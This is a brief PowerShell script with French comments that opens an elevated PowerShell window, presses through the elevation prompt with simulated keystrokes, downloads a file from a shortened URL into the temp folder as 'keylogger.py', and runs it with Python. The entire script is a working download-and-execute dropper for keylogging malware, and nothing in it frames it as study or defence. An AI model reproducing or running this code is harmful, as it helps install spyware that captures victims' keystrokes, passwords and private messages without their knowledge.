# Attente de 5 secondes (300 * 5) pour s'assurer que la fenêtre PowerShell est prête
Start-Sleep -Seconds 5

# Démarrer un nouveau processus PowerShell en tant qu'administrateur
Start-Process powershell -Verb RunAs

# Attendre 2 secondes pour que la nouvelle fenêtre PowerShell s'ouvre
Start-Sleep -Seconds 2

# Ouvrir les options de la fenêtre PowerShell
[System.Windows.Forms.SendKeys]::SendWait('%O')
Start-Sleep -Milliseconds 500
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}')

# Créer un objet WebClient
$WebClient = New-Object System.Net.WebClient

# Télécharger le script depuis Internet et l'enregistrer dans le dossier temporaire
$WebClient.DownloadFile("https://rebrand.ly/5uapstf", "$env:temp\keylogger.py")

# Exécuter le script Python depuis le dossier temporaire
python3 "$env:temp\keylogger.py"
